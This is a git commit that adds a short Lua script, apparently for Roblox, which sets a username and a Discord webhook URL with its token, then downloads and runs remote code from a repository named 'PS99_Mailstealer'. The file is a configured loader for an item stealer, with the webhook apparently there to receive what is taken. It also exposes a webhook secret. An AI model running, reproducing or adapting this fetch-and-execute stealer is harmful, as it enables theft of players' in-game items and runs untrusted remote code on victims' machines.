b2c9404608fbbac49bfb0f1748b3ad880e24b7b0
ProKaptan11 <prokaptan11@gmail.com>
2025-03-01 13:22:07 +0400

    Add files via upload

---
+++ HGE.lua
@@ -0,0 +1,5 @@
+Username = "eli_cakma"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1345317032236679310/A9EXtJLkjTBiljbKLqCxtjRzkWPeNBaiL_miCHp_zzSHa38Qk3Ot-4Gu7G88eWId1gkA" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
